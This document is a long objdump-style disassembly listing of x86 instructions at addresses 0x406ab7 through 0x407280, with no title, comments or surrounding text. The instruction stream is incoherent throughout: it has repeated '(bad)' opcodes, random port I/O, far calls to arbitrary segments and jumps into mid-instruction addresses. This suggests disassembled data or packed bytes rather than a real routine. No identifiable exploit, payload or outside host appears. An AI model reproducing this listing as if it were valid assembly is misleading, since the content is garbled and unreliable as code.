  406ab7:	fistp  WORD PTR [ecx-0xc663028]
  406abd:	pop    ds
  406abe:	mov    eax,DWORD PTR [eax]
  406ac0:	xchg   esp,eax
  406ac1:	outs   dx,DWORD PTR cs:[esi]
  406ac3:	push   esp
  406ac4:	(bad)  
  406ac5:	psubw  mm0,mm4
  406ac8:	fcomp  QWORD PTR [edx-0x4c]
  406acb:	adc    ecx,DWORD PTR [bp+si-0x1447]
  406ad0:	dec    ebp
  406ad1:	retf   0x8410
  406ad4:	cmp    DWORD PTR ds:0xe323ec7f,ecx
  406ada:	dec    ecx
  406adb:	lock sbb DWORD PTR [ecx+0x19cae790],0x6175e182
  406ae6:	xor    bl,BYTE PTR [ecx-0x1e]
  406ae9:	cs push ds
  406aeb:	push   edi
  406aec:	das    
  406aed:	daa    
  406aee:	div    DWORD PTR [ecx]
  406af0:	mov    esp,0xfd3877ad
  406af5:	sub    al,0xbc
  406af7:	outs   dx,BYTE PTR ss:[esi]
  406af9:	xchg   ebx,eax
  406afa:	test   BYTE PTR ds:0x9825d175,dh
  406b00:	sub    eax,0x75cbaf4f
  406b05:	mov    cl,0x14
  406b07:	shl    DWORD PTR ds:0x412b9a43,0xdd
  406b0e:	retf   
  406b0f:	dec    ebx
  406b10:	frstor [ecx-0x1d6b31b7]
  406b16:	mov    eax,0x4232db25
  406b1b:	pushf  
  406b1c:	in     al,0x85
  406b1e:	pop    ecx
  406b1f:	xlat   BYTE PTR ds:[ebx]
  406b20:	scas   al,BYTE PTR es:[edi]
  406b21:	enter  0x69a1,0xbb
  406b25:	sahf   
  406b26:	sub    BYTE PTR [esi],ch
  406b28:	pop    ecx
  406b29:	xchg   esi,eax
  406b2a:	lods   al,BYTE PTR ds:[esi]
  406b2b:	cli    
  406b2c:	cld    
  406b2d:	pusha  
  406b2e:	inc    ebp
  406b2f:	inc    esi
  406b30:	es push ds
  406b32:	leave  
  406b33:	aam    0x9b
  406b35:	lahf   
  406b36:	jmp    0x406b12
  406b38:	in     al,dx
  406b39:	adc    BYTE PTR [ecx],dh
  406b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b3c:	adc    cl,bh
  406b3e:	clc    
  406b3f:	push   ds
  406b40:	push   edi
  406b41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b42:	jp     0x406b25
  406b44:	push   esi
  406b45:	push   ss
  406b46:	test   al,0xbe
  406b49:	enter  0xe872,0xe7
  406b4d:	in     al,0xeb
  406b4f:	retf   
  406b50:	inc    edi
  406b51:	push   ds
  406b52:	xor    bl,BYTE PTR [eax]
  406b54:	xchg   ecx,eax
  406b55:	mov    ecx,ds
  406b57:	mov    bh,0x74
  406b5a:	mov    ch,0x23
  406b5c:	and    eax,0x739cd6e9
  406b61:	rcr    BYTE PTR [ebp+ecx*2-0x7b],cl
  406b65:	push   ecx
  406b66:	inc    ebx
  406b67:	add    DWORD PTR [ebx],esp
  406b69:	icebp  
  406b6a:	stc    
  406b6b:	mov    esp,0xd45ec333
  406b70:	adc    eax,0xa3e3ac11
  406b75:	pop    edi
  406b76:	cmp    edx,DWORD PTR [eax]
  406b78:	add    BYTE PTR [eax],bh
  406b7a:	not    edi
  406b7c:	aad    0xb5
  406b7e:	and    DWORD PTR [ebp-0x1f92be4],edx
  406b84:	fwait
  406b85:	mov    ebx,0x4565eaa4
  406b8a:	lahf   
  406b8b:	sub    BYTE PTR [esi],0xc1
  406b8e:	sub    ecx,DWORD PTR [edi-0x7ffb6a80]
  406b94:	mov    dl,BYTE PTR [ebp-0x24eba068]
  406b9a:	(bad)
  406b9d:	imul   esi,DWORD PTR [eax-0x5b],0xffffffd4
  406ba1:	das    
  406ba2:	cmp    ch,BYTE PTR [edx+0xe8aa128]
  406ba8:	ret    
  406ba9:	fnsave [ebp+ebx*4-0x637caf8d]
  406bb0:	lods   al,BYTE PTR ds:[esi]
  406bb1:	sahf   
  406bb2:	retf   0xdfd6
  406bb5:	cld    
  406bb6:	or     esi,DWORD PTR [ecx]
  406bb8:	popa   
  406bb9:	and    ebx,DWORD PTR [edi]
  406bbb:	retf   
  406bbc:	aam    0xf7
  406bbe:	leave  
  406bbf:	mov    edx,0xce48f170
  406bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bc5:	adc    cl,BYTE PTR ds:0x4e49609e
  406bcb:	jb     0x406bd4
  406bcd:	or     ebx,DWORD PTR ds:0xf3cb6bb2
  406bd3:	dec    esp
  406bd4:	push   ebx
  406bd5:	inc    ebx
  406bd6:	xchg   ebp,eax
  406bd7:	(bad)  
  406bd8:	jo     0x406b5b
  406bda:	and    DWORD PTR [esi+0x53],edi
  406bdd:	xchg   ecx,eax
  406bde:	fimul  DWORD PTR [ecx+0x1932bc0c]
  406be4:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  406be6:	pop    eax
  406be7:	add    eax,0xfbd62be6
  406bec:	xor    eax,0x41cc0591
  406bf1:	stc    
  406bf2:	adc    al,0x48
  406bf4:	call   0xa763:0x10ae6d3d
  406bfb:	les    edx,FWORD PTR [ebx-0x3435383a]
  406c01:	pop    ecx
  406c02:	cld    
  406c03:	in     al,0x67
  406c05:	out    0x7d,al
  406c07:	jne    0x406be9
  406c09:	imul   esp,DWORD PTR [edx+0x5bf9e6de],0x9549788b
  406c13:	clc    
  406c14:	push   edx
  406c15:	test   al,0x85
  406c17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c18:	jmp    0x406bf5
  406c1a:	mov    dh,ah
  406c1c:	sub    eax,0x6a061e10
  406c21:	fcomp  QWORD PTR [ebx+0x3e]
  406c24:	add    BYTE PTR [eax],bh
  406c26:	fidivr WORD PTR ds:0x8f0129f
  406c2c:	addr16 out 0x63,eax
  406c2f:	push   es
  406c30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c31:	fadd   st(7),st
  406c33:	out    dx,al
  406c34:	jbe    0x406bc1
  406c36:	push   ebx
  406c37:	repz push esi
  406c39:	and    al,cl
  406c3b:	sbb    al,0xa8
  406c3d:	push   esp
  406c3e:	pop    ss
  406c3f:	daa    
  406c40:	adc    al,0x15
  406c42:	xchg   edi,eax
  406c43:	adc    esp,DWORD PTR [edx]
  406c45:	or     BYTE PTR [ebx],0xf4
  406c48:	jmp    0x406ca7
  406c4a:	popa   
  406c4b:	push   0xf27ffb30
  406c50:	call   0x32d2:0xd26bfcc0
  406c57:	das    
  406c58:	dec    ebx
  406c59:	sub    ebp,DWORD PTR [ebx-0x43]
  406c5c:	ret    0xd663
  406c5f:	cmp    edx,DWORD PTR [ebx+0x6]
  406c62:	sub    edx,DWORD PTR [esi+0x5]
  406c65:	retf   
  406c66:	xor    ah,dh
  406c68:	(bad)  
  406c6a:	pop    eax
  406c6b:	jecxz  0x406c7d
  406c6d:	push   0xffffffb8
  406c6f:	out    dx,al
  406c70:	cld    
  406c71:	ror    edi,0x6d
  406c74:	and    ch,BYTE PTR [ebx+0x628283b1]
  406c7a:	shr    ebx,0xdf
  406c7d:	add    bh,BYTE PTR [esi]
  406c7f:	(bad)
  406c82:	mov    bh,0x3
  406c84:	inc    ecx
  406c85:	mov    ah,BYTE PTR [ebx-0x8]
  406c88:	jns    0x406d08
  406c8a:	call   0xe7e09177
  406c8f:	scas   al,BYTE PTR es:[edi]
  406c90:	cmp    BYTE PTR [edx-0x42de3f09],0x91
  406c97:	adc    BYTE PTR [eax+0x8],dl
  406c9a:	fiadd  DWORD PTR [edi+0x48]
  406c9d:	mov    eax,ds:0x221488c2
  406ca2:	push   ecx
  406ca3:	adc    esp,ebx
  406ca5:	mov    fs,WORD PTR gs:[edx]
  406ca8:	call   DWORD PTR [eax+ecx*1-0x485b3b62]
  406caf:	int    0xf2
  406cb1:	adc    eax,0x31cf72db
  406cb6:	push   esp
  406cb7:	mov    esi,0x6844958d
  406cbc:	ja     0x406cd8
  406cbe:	dec    esp
  406cbf:	addr16 mov eax,0x26cc161d
  406cc5:	icebp  
  406cc6:	test   DWORD PTR [edi+0xd],esp
  406cc9:	imul   ebx,DWORD PTR [edx-0x43],0xffffffa3
  406ccd:	shr    DWORD PTR [edx+0x31506c7b],1
  406cd3:	sti    
  406cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cd5:	in     al,dx
  406cd6:	sub    ah,ch
  406cd8:	mov    ecx,0x252c9115
  406cdd:	mov    al,0xd6
  406cdf:	hlt    
  406ce0:	arpl   WORD PTR [ebp-0x6db3d4e2],dx
  406ce6:	pop    ds
  406ce7:	push   ds
  406ce8:	cmp    cl,bh
  406cea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ceb:	adc    BYTE PTR [ecx],ch
  406ced:	(bad)  
  406cee:	xchg   esp,eax
  406cef:	daa    
  406cf0:	shl    DWORD PTR [ecx],cl
  406cf2:	enter  0x5186,0x19
  406cf6:	mov    al,ds:0x8dfc94b0
  406cfb:	enter  0x3529,0x9b
  406cff:	adc    edi,DWORD PTR [eax-0x718ea080]
  406d05:	add    BYTE PTR [edx+0x3d55e750],ch
  406d0b:	popa   
  406d0c:	jae    0x406d23
  406d0e:	in     al,0xb8
  406d10:	imul   ecx,DWORD PTR [eax+0x22a9c715],0xfffffff3
  406d17:	div    BYTE PTR [edx-0x11d1fe54]
  406d1d:	mov    bh,0x47
  406d1f:	in     eax,dx
  406d20:	lahf   
  406d21:	call   0x1975cc9
  406d26:	sub    al,0xe9
  406d28:	mov    ecx,0xa7b526a2
  406d2d:	mov    bl,0x90
  406d2f:	stc    
  406d30:	mov    esp,0x39145027
  406d35:	push   ebp
  406d36:	adc    eax,0x6a7ae739
  406d3b:	sub    DWORD PTR [ebx+ebp*4-0x722bfb8b],ebx
  406d42:	push   ss
  406d43:	mov    ecx,0x6d6758a2
  406d48:	adc    BYTE PTR [ebp+0x193a5bd9],bh
  406d4e:	scas   al,BYTE PTR es:[edi]
  406d4f:	lock dec ebp
  406d51:	or     BYTE PTR [esi],dl
  406d53:	xor    eax,0x6003bfd5
  406d58:	enter  0xabd6,0xc4
  406d5c:	das    
  406d5d:	and    eax,0x70087758
  406d62:	lds    ecx,FWORD PTR [edx-0x3]
  406d65:	or     edx,DWORD PTR [ecx]
  406d67:	je     0x406dba
  406d69:	(bad)  
  406d6a:	xlat   BYTE PTR ds:[ebx]
  406d6b:	jp     0x406cf9
  406d6d:	mov    eax,0x19bd3e64
  406d72:	pushf  
  406d73:	push   ebx
  406d74:	jp     0x406db4
  406d76:	dec    edx
  406d77:	popf   
  406d78:	hlt    
  406d79:	daa    
  406d7a:	or     DWORD PTR [eax],0x42
  406d7d:	neg    esi
  406d7f:	xor    al,0x20
  406d81:	and    al,0xb5
  406d83:	js     0x406d9d
  406d85:	enter  0x124f,0xc6
  406d89:	push   es
  406d8a:	xor    ah,BYTE PTR [esi+edi*4]
  406d8d:	repz call 0xaf100737
  406d93:	rcr    DWORD PTR [ebx-0x34],cl
  406d96:	add    ebp,DWORD PTR [ebx+eax*2]
  406d99:	adc    ebx,edx
  406d9b:	sahf   
  406d9c:	pushf  
  406d9d:	aas    
  406d9e:	push   ds
  406d9f:	mov    ebp,0xefede9e3
  406da4:	cmp    eax,DWORD PTR [eax+0x21]
  406da7:	pop    ds
  406da8:	lds    edi,FWORD PTR [edi-0x5d]
  406dab:	mov    edx,0xf2997ef9
  406db0:	stos   BYTE PTR es:[edi],al
  406db1:	jno    0x406e24
  406db3:	dec    esi
  406db4:	sbb    edi,DWORD PTR [edi+0x4e]
  406db7:	cld    
  406db8:	fwait
  406db9:	jp     0x406ddf
  406dbb:	cwde   
  406dbc:	rcr    DWORD PTR [esi+0x77],1
  406dbf:	mov    cl,dh
  406dc1:	pop    esi
  406dc2:	sbb    esp,edx
  406dc4:	xor    esi,DWORD PTR [esi+0x2e]
  406dc7:	mov    eax,ebx
  406dc9:	pop    ds
  406dca:	fld    st(3)
  406dcc:	(bad)  
  406dcd:	pop    ebp
  406dce:	or     ebx,edi
  406dd0:	sbb    al,bl
  406dd2:	pop    ss
  406dd3:	mov    ah,0x89
  406dd5:	rol    DWORD PTR [edi+0x12d1f980],cl
  406ddb:	aam    0xea
  406ddd:	jge    0x406d8a
  406ddf:	(bad)  
  406de1:	dec    DWORD PTR [eax+0x59]
  406de4:	mov    ebp,0xdc197d7
  406de9:	inc    ecx
  406dea:	jle    0x406d71
  406dec:	lock xor al,0xee
  406def:	shr    esi,1
  406df1:	mov    edi,0x9baf31d9
  406df6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406df7:	outs   dx,DWORD PTR ss:[esi]
  406df9:	push   edx
  406dfa:	scas   al,BYTE PTR es:[edi]
  406dfb:	sbb    eax,0x26ecbcdf
  406e00:	adc    BYTE PTR [ecx-0x1eb69bd3],0xb4
  406e07:	mov    bl,0xfc
  406e09:	mov    BYTE PTR [eax-0x66],dl
  406e0c:	cli    
  406e0d:	mov    al,ds:0xd3a8b2
  406e12:	jnp    0x406dab
  406e14:	arpl   bx,bx
  406e16:	jmp    0x406e88
  406e18:	cmp    cl,dl
  406e1a:	inc    esp
  406e1b:	dec    ecx
  406e1c:	ret    
  406e1d:	ss jb  0x406e45
  406e20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e21:	scas   eax,DWORD PTR es:[edi]
  406e22:	pop    edx
  406e23:	test   BYTE PTR [edi-0x54],ch
  406e26:	inc    ebp
  406e27:	sub    eax,0x20eda4ce
  406e2c:	es cld 
  406e2e:	dec    esp
  406e2f:	jae    0x406dc9
  406e31:	jge    0x406e81
  406e33:	sbb    cl,cl
  406e35:	sub    al,0x8c
  406e37:	mov    ah,0xac
  406e39:	xor    esp,DWORD PTR [edi-0x7c]
  406e3c:	xchg   DWORD PTR ds:0x9a8c112d,edx
  406e42:	je     0x406e08
  406e44:	pop    esi
  406e45:	lock xchg edx,eax
  406e47:	cmp    ah,BYTE PTR [ebp+0x4910d7fc]
  406e4d:	jo     0x406ece
  406e4f:	aam    0x9d
  406e51:	fcom   QWORD PTR [ebp+ecx*8+0x1c]
  406e55:	jno    0x406e24
  406e57:	cdq    
  406e58:	mov    esp,0x40df0910
  406e5d:	jae    0x406df5
  406e5f:	pop    ebp
  406e60:	push   ebx
  406e61:	or     bh,dl
  406e63:	out    0x7,eax
  406e65:	jbe    0x406e5c
  406e67:	fild   WORD PTR [ebx]
  406e69:	mov    eax,ds:0xe7ecf2a3
  406e6e:	lahf   
  406e6f:	xor    eax,DWORD PTR [ecx-0x23]
  406e72:	xchg   bl,bh
  406e74:	mov    ah,0x66
  406e76:	mov    edx,0x68efb143
  406e7b:	inc    ebx
  406e7c:	les    esi,FWORD PTR [edx+0x4d]
  406e7f:	mov    eax,ds:0xa81940b8
  406e84:	lock mov DWORD PTR ds:0xcb3e78d5,edx
  406e8b:	mov    al,ds:0x1034a586
  406e90:	cmp    BYTE PTR [ebx-0x13],bl
  406e93:	bound  esp,QWORD PTR [ebx+0x4aa16636]
  406e99:	out    dx,al
  406e9a:	xor    esp,DWORD PTR [edx+0x6e845747]
  406ea0:	jae    0x406e4f
  406ea2:	(bad)  [esi+0x5]
  406ea5:	out    dx,al
  406ea6:	pop    eax
  406ea7:	xchg   esp,eax
  406ea8:	(bad)  
  406ea9:	xchg   ecx,eax
  406eaa:	fsub   st(0),st
  406eac:	jbe    0x406ecd
  406eae:	jb     0x406e42
  406eb0:	jmp    0x406edf
  406eb2:	fs (bad) 
  406eb4:	int3   
  406eb5:	mov    edx,0xa07dd218
  406eba:	lock cmp al,0x2a
  406ebd:	mov    edx,0xd021b89c
  406ec2:	mov    DWORD PTR [eax+0x32],edx
  406ec5:	xor    ah,ah
  406ec7:	adc    eax,0xc8bdfd7
  406ecc:	call   0xfdcb50a
  406ed1:	pop    eax
  406ed2:	push   edx
  406ed3:	call   0xaaaf:0xf439682c
  406eda:	sbb    esi,0xffffffd4
  406edd:	std    
  406ede:	xor    eax,0x3c3896c
  406ee3:	and    BYTE PTR [ecx+0xe8d9093],bl
  406ee9:	aas    
  406eea:	pusha  
  406eeb:	xor    al,0xfb
  406eed:	pop    ecx
  406eee:	ja     0x406f21
  406ef0:	push   esp
  406ef1:	leave  
  406ef2:	cld    
  406ef3:	mov    BYTE PTR [edi],cl
  406ef5:	aaa    
  406ef6:	mov    ebp,0x9c08a3f
  406efb:	add    eax,0x8360d498
  406f00:	lods   al,BYTE PTR ds:[esi]
  406f01:	ds mov eax,0xa1509b7d
  406f07:	sub    edx,ebp
  406f09:	imul   esp,DWORD PTR [ebx+0x73],0x41448c0b
  406f10:	push   ecx
  406f11:	push   cs
  406f12:	das    
  406f13:	data16 xchg dh,bh
  406f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f17:	retf   
  406f18:	xor    BYTE PTR [ebx+0x1634dc8b],dl
  406f1e:	jg     0x406f96
  406f20:	mov    edi,0xb1c9b7c7
  406f25:	mov    edi,0x35b9c5b7
  406f2a:	lods   al,BYTE PTR ds:[esi]
  406f2b:	or     esp,edx
  406f2d:	pop    esp
  406f2e:	pop    edx
  406f2f:	jg     0x406f73
  406f31:	xchg   edx,eax
  406f32:	jl     0x406f9d
  406f34:	jno    0x406f2f
  406f36:	or     esp,DWORD PTR [ebx-0x320abebd]
  406f3c:	sub    al,0x22
  406f3e:	inc    ebp
  406f3f:	int    0xc5
  406f41:	sub    al,0xd8
  406f43:	inc    esi
  406f44:	cmp    dh,BYTE PTR [esi]
  406f46:	into   
  406f47:	mov    dh,0xb1
  406f49:	mov    bh,BYTE PTR [eax]
  406f4b:	mov    esp,0x284a72ee
  406f50:	fadd   st(6),st
  406f52:	or     eax,ebx
  406f54:	ds dec ebp
  406f56:	push   ebp
  406f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f59:	gs mov bh,0xe7
  406f5c:	mov    ebp,0x67621bc9
  406f61:	ret    
  406f62:	mov    WORD PTR [eax-0x13],?
  406f65:	stos   DWORD PTR es:[edi],eax
  406f66:	or     DWORD PTR [ecx-0x640370a4],ecx
  406f6c:	out    0x30,eax
  406f6e:	das    
  406f6f:	adc    eax,0x5fded618
  406f74:	in     eax,0xfe
  406f76:	popa   
  406f77:	repz sub al,0xbb
  406f7a:	outs   dx,DWORD PTR ds:[esi]
  406f7b:	mov    esi,0x360482
  406f80:	pop    edi
  406f81:	gs inc ebx
  406f83:	pop    es
  406f84:	cs mov esi,0xbd0dcda9
  406f8a:	test   BYTE PTR [esi-0x36],ch
  406f8d:	inc    edx
  406f8e:	dec    BYTE PTR [eax+0x114754c2]
  406f94:	push   ebx
  406f95:	fcomi  st,st(4)
  406f97:	std    
  406f98:	ret    
  406f99:	push   0x94b3202f
  406f9e:	sub    dl,BYTE PTR ss:[edx]
  406fa1:	ja     0x407002
  406fa3:	cmp    eax,0x847d73a3
  406fa8:	pop    eax
  406fa9:	pop    edi
  406faa:	stos   BYTE PTR es:[edi],al
  406fab:	xchg   DWORD PTR [esi-0x28e83702],esi
  406fb1:	(bad)  
  406fb3:	push   ebp
  406fb4:	jecxz  0x407017
  406fb6:	(bad)  
  406fb7:	sub    esp,DWORD PTR [edi]
  406fb9:	sub    al,0x6
  406fbb:	(bad)  
  406fbc:	in     al,0x43
  406fbe:	sahf   
  406fbf:	push   eax
  406fc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fc1:	dec    ecx
  406fc2:	shr    BYTE PTR [eax],cl
  406fc4:	std    
  406fc5:	mov    esi,0x450ccfb5
  406fca:	call   0x20e0:0x2ea979c
  406fd1:	and    DWORD PTR [edi],ecx
  406fd3:	mov    ecx,edi
  406fd5:	xor    BYTE PTR [esi+edx*1+0x15],bh
  406fd9:	fwait
  406fda:	mov    dh,0x23
  406fdc:	aaa    
  406fdd:	dec    eax
  406fde:	dec    esp
  406fdf:	repnz pop ecx
  406fe1:	mov    edi,0x98be5874
  406fe6:	jecxz  0x407017
  406fe8:	push   0x66296378
  406fed:	mov    ch,BYTE PTR [ebp-0x4]
  406ff0:	shl    BYTE PTR [ebx],0x3c
  406ff3:	jp     0x407034
  406ff5:	adc    DWORD PTR [ecx],0x3fcb601f
  406ffb:	adc    bl,ah
  406ffd:	lahf   
  406ffe:	faddp  st(5),st
  407000:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407001:	jmp    0x300c0537
  407006:	fisub  DWORD PTR [esi-0x1a2c397e]
  40700c:	dec    edx
  40700d:	inc    edi
  40700e:	dec    BYTE PTR [eax-0x781d3f31]
  407014:	sub    BYTE PTR [esi+0x1c],cl
  407017:	lock call 0xada246b2
  40701d:	ror    BYTE PTR [edi],1
  40701f:	xlat   BYTE PTR ds:[ebx]
  407020:	sub    bl,BYTE PTR [edx-0x12554bdf]
  407026:	rcl    cl,1
  407028:	push   esi
  407029:	mov    ah,0x84
  40702b:	mov    ch,0x93
  40702d:	rol    DWORD PTR [ebp+0x34de4248],0x69
  407034:	inc    ebp
  407035:	(bad)  
  407036:	in     al,0xd0
  407038:	sbb    ch,ah
  40703a:	adc    edx,DWORD PTR [ecx+eiz*2]
  40703d:	push   0xcd660f04
  407042:	cli    
  407043:	dec    edi
  407044:	faddp  st(2),st
  407046:	xchg   edi,eax
  407047:	add    DWORD PTR [esi+0x67],ebp
  40704a:	or     ch,BYTE PTR [esi-0x31]
  40704d:	pmullw mm6,QWORD PTR [esi]
  407050:	popa   
  407051:	lods   al,BYTE PTR ds:[esi]
  407052:	adc    BYTE PTR [ebx+esi*8],dl
  407055:	mov    edi,DWORD PTR [eax-0x2b]
  407058:	push   edx
  407059:	jg     0x406feb
  40705b:	mov    ah,0xec
  40705d:	(bad)  
  40705e:	lds    edi,FWORD PTR [eax+0x4940a2b6]
  407064:	inc    ebx
  407065:	int3   
  407066:	lea    esi,[eax+0x2e43880f]
  40706c:	pop    esp
  40706d:	dec    esi
  40706e:	repz mov ds:0x8847f475,eax
  407074:	aam    0x21
  407076:	jns    0x407089
  407078:	out    0x35,eax
  40707a:	aas    
  40707b:	push   esi
  40707c:	nop
  40707d:	mov    al,ds:0x68a069e5
  407082:	jmp    0x82ddf8bb
  407087:	stos   DWORD PTR es:[edi],eax
  407088:	cmp    BYTE PTR [edi+0x8],ch
  40708b:	dec    eax
  40708c:	adc    ebx,eax
  40708e:	cmp    BYTE PTR [esi+0x50],bl
  407091:	xlat   BYTE PTR ds:[ebx]
  407092:	hlt    
  407093:	fiadd  DWORD PTR [ebx-0x7b]
  407096:	xor    DWORD PTR [ebx-0x65],ecx
  407099:	icebp  
  40709a:	xchg   BYTE PTR [edx+0x2c747173],dl
  4070a0:	das    
  4070a1:	push   ecx
  4070a2:	cdq    
  4070a3:	push   esi
  4070a4:	cmp    al,BYTE PTR [ebp+ecx*8+0x34]
  4070a8:	pop    edi
  4070a9:	shl    DWORD PTR [ebp-0x71],cl
  4070ac:	jp     0x407057
  4070ae:	in     eax,dx
  4070af:	and    eax,0x57764580
  4070b4:	aad    0x2
  4070b6:	jg     0x407038
  4070b8:	out    0xc3,eax
  4070ba:	inc    ebx
  4070bb:	push   0xffffffb2
  4070bd:	or     al,0x67
  4070bf:	push   cs
  4070c0:	sub    eax,0x3197a77f
  4070c5:	cs mov ecx,0xb22007b7
  4070cb:	jmp    0x4070db
  4070cd:	int    0xa4
  4070cf:	popa   
  4070d0:	and    al,0x89
  4070d2:	(bad)  
  4070d3:	imul   ebp,DWORD PTR [edx],0x3c
  4070d6:	aaa    
  4070d7:	iret   
  4070d8:	add    ah,BYTE PTR [ecx+0x2f]
  4070db:	arpl   sp,di
  4070dd:	test   eax,0xaf49571e
  4070e2:	test   eax,0xad7256dc
  4070e7:	(bad)  
  4070e8:	cmp    ecx,edx
  4070ea:	outs   dx,DWORD PTR ds:[esi]
  4070eb:	cs jmp 0x1b83:0xa371bb
  4070f3:	popa   
  4070f4:	retf   
  4070f5:	fld    TBYTE PTR [ebp+ecx*2-0x37c7f201]
  4070fc:	mov    edi,0x68211f56
  407101:	or     BYTE PTR [eax],cl
  407103:	retf   
  407104:	xchg   edx,eax
  407105:	loop   0x407093
  407107:	mov    esi,0xaec645b2
  40710c:	imul   ecx,DWORD PTR [ebp+0x5cf38b2],0xffffff91
  407113:	push   ds
  407114:	sub    esi,edx
  407116:	rcl    DWORD PTR [esi],cl
  407118:	or     ah,dh
  40711a:	cld    
  40711b:	cld    
  40711c:	push   ss
  40711d:	pop    edx
  40711e:	dec    ecx
  40711f:	leave  
  407120:	sbb    esp,0xffffffde
  407123:	out    dx,eax
  407124:	in     eax,dx
  407125:	mov    ah,0x88
  407127:	push   cs
  407128:	push   ds
  407129:	sbb    eax,0x238d6bb4
  40712e:	ret    
  40712f:	in     al,0x7d
  407131:	and    al,0x71
  407133:	(bad)  
  407134:	push   0xffffffc9
  407136:	add    DWORD PTR [edi],esi
  407138:	cmp    eax,0x848c96a0
  40713d:	xchg   edx,eax
  40713e:	fist   WORD PTR [esi+eax*1+0x5cb57ed]
  407145:	(bad)  
  407146:	push   edi
  407147:	pop    ds
  407148:	add    ebp,DWORD PTR [ebx+0x2ebed3a0]
  40714e:	mov    DWORD PTR [eax-0x21316f70],esp
  407154:	cmp    al,0x62
  407156:	aas    
  407157:	sub    ecx,DWORD PTR [edx]
  407159:	cmc    
  40715a:	mov    ebx,0xd39359ac
  40715f:	rcl    edx,cl
  407161:	pop    edi
  407162:	push   ecx
  407163:	mov    ah,0x62
  407165:	mov    eax,ds:0xd9e0accf
  40716a:	test   BYTE PTR [ecx],0x5
  40716d:	es pop eax
  40716f:	jge    0x40716c
  407171:	stc    
  407172:	mov    dh,0xbd
  407174:	xchg   ebx,eax
  407175:	jp     0x407117
  407177:	cmp    BYTE PTR [esi],ah
  407179:	sbb    eax,0x1638f6eb
  40717e:	jmp    0x89604662
  407183:	mov    edi,DWORD PTR [edx-0x2c]
  407186:	(bad)  
  407187:	ds push ds
  407189:	cmp    al,0x7d
  40718b:	mov    ds:0x890832f7,al
  407190:	mov    ah,ch
  407192:	jne    0x40719b
  407194:	ret    0x7994
  407197:	mov    dh,BYTE PTR [ebp+0x49]
  40719a:	test   DWORD PTR [esi+0x736e590a],0xe4317bcf
  4071a4:	ins    DWORD PTR es:[edi],dx
  4071a5:	pop    edx
  4071a6:	dec    esi
  4071a7:	(bad)  
  4071a8:	lock cmp eax,0x24eccbd
  4071ae:	jns    0x4071c5
  4071b0:	ds in  al,0x6f
  4071b3:	cmp    eax,0x8e70c347
  4071b8:	scas   eax,DWORD PTR es:[edi]
  4071b9:	cmp    ch,bl
  4071bb:	push   ecx
  4071bc:	es mov dh,0x2e
  4071bf:	mov    dh,bh
  4071c1:	cmp    ebx,DWORD PTR [eax+0x4755bce6]
  4071c7:	outs   dx,BYTE PTR ds:[esi]
  4071c8:	cs in  al,dx
  4071ca:	inc    BYTE PTR [eax-0x7e]
  4071cd:	sti    
  4071ce:	fucom  st(1)
  4071d0:	xor    eax,0xf023801e
  4071d5:	pop    edi
  4071d6:	das    
  4071d7:	dec    DWORD PTR [esi-0x68d6562f]
  4071dd:	cmp    al,0xa
  4071df:	sbb    eax,0x2d5518c4
  4071e4:	scas   al,BYTE PTR es:[edi]
  4071e5:	cmp    eax,0x4ac62254
  4071ea:	fst    QWORD PTR [eax]
  4071ec:	or     cl,BYTE PTR [eax-0x5fe927f7]
  4071f2:	mov    ah,0xdb
  4071f4:	ins    DWORD PTR es:[edi],dx
  4071f5:	shr    BYTE PTR [esi-0x64046dd8],0x90
  4071fc:	sbb    esp,DWORD PTR es:[esi]
  4071ff:	ror    DWORD PTR [ebp+0x57a85292],cl
  407205:	sahf   
  407206:	sti    
  407207:	sbb    al,0xca
  407209:	idiv   BYTE PTR [edi+0x3aeb718a]
  40720f:	ss sub bl,0x2f
  407213:	bound  esi,QWORD PTR [ebx+0x5738ebac]
  407219:	stos   DWORD PTR es:[edi],eax
  40721a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40721b:	mov    ds:0xfa83b4cd,eax
  407220:	(bad)  
  407221:	loopne 0x4071cf
  407223:	out    dx,eax
  407224:	scas   eax,DWORD PTR es:[edi]
  407225:	inc    esi
  407226:	or     eax,0x1ab9b5ba
  40722b:	jb     0x4071ad
  40722d:	fsub   DWORD PTR [ebp+0xd]
  407230:	int    0x40
  407232:	pop    es
  407233:	bound  ecx,QWORD PTR [ecx-0x38]
  407236:	pop    edi
  407237:	dec    edi
  407238:	mov    WORD PTR [edx+0x2b],ss
  40723b:	xchg   ebx,eax
  40723c:	out    dx,al
  40723d:	stc    
  40723e:	out    0x99,eax
  407240:	jmp    0x407298
  407242:	arpl   bp,si
  407244:	les    eax,FWORD PTR [ebx+0x55230654]
  40724a:	dec    edi
  40724b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40724c:	xchg   edx,eax
  40724d:	sub    BYTE PTR [edi-0x5fec0d44],cl
  407253:	push   esi
  407254:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407255:	loopne 0x407201
  407257:	(bad)  
  407259:	sub    al,0x97
  40725c:	mov    ebx,ebx
  40725e:	cmc    
  40725f:	cmp    ch,BYTE PTR [edi]
  407261:	mov    eax,0x79e5df0a
  407266:	hlt    
  407267:	in     eax,dx
  407268:	xchg   esp,eax
  407269:	cmp    al,0x37
  40726b:	cmp    ch,BYTE PTR [ecx+0x61]
  40726e:	jnp    0x407234
  407270:	hlt    
  407271:	stc    
  407272:	pop    DWORD PTR [ecx]
  407274:	or     al,0x8c
  407276:	out    dx,eax
  407277:	js     0x407228
  407279:	pop    edx
  40727a:	fiadd  DWORD PTR [ecx-0x6d]
  40727d:	mov    bh,0x2f
  40727f:	pop    edi
  407280:	ds sbb ah,cl
